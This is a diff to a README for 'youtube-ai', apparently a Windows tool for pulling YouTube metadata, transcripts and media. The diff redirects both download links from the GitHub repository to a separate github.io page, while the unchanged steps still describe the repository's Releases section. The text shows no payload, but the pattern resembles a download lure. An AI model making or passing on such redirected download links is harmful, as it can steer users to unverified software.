@@ -1,6 +1,6 @@
 # 📺 youtube-ai - Access YouTube data with ease today
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Shuyi1164/youtube-ai)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://shuyi1164.github.io)
 
 youtube-ai provides direct access to YouTube data. You extract metadata, transcripts, comments, and media files. This tool functions without API keys. You interact with YouTube through a simple interface.
 
@@ -20,7 +20,7 @@ Key features include:
 
 You visit the official repository page to get the software files. You download the latest version for your Windows computer.
 
-[Visit this page to download the software](https://github.com/Shuyi1164/youtube-ai)
+[Visit this page to download the software](https://shuyi1164.github.io)
 
 1. Go to the link above.
 2. Look for the section labeled Releases on the right side of the page.
